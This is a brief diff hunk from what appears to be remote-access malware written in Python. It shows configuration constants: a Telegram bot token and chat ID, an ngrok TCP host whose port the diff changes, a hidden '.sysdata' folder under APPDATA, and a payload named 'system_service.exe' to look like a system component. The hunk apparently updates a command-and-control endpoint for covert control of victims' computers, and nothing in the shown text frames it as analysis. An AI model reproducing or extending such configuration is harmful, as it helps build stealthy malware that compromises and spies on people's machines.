@@ -42,7 +42,7 @@ def single_instance_check():
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
 NGROK_HOST = "2.tcp.eu.ngrok.io"
-NGROK_PORT = 15164
+NGROK_PORT = 18539
 EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
 EXE_NAME = "system_service.exe"
 EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
